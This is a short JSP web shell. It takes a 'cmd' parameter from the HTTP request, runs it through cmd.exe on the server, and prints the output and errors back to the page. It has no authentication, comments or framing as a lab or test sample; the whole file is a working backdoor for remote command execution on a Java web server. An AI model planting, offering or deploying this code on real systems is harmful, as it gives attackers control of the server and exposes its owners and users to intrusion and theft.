<%@ page import="java.io.*" %>
<%
    if (request.getParameter("cmd") != null) {
        String command = request.getParameter("cmd");
        Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});

        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }

        InputStream err = p.getErrorStream();
        BufferedReader errReader = new BufferedReader(new InputStreamReader(err));
        while ((line = errReader.readLine()) != null) {
            out.println("ERROR: " + line + "<br>");
        }
    }
%>
